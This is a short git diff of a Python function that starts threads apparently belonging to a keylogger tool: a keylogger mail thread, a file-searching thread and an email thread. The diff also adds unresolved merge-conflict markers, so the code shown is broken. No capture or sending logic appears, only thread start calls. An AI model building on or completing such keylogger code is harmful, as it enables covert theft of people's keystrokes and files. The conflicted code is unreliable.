@@ -459,6 +459,7 @@ def kickOff():
     keylogger_mail_thread.start()
     stop_keylogger_mail_thread.start()
 
+<<<<<<< HEAD
 
 
 
@@ -469,6 +470,13 @@ def kickOff():
 
     # Start the threads for emailing
 
+=======
+    #Start the threads for file copy
+    searching_thread.start()
+    stop_searching_thread.start()
+
+    # Start the threads for emailing
+>>>>>>> origin/master
     email_thread.start()
     
 
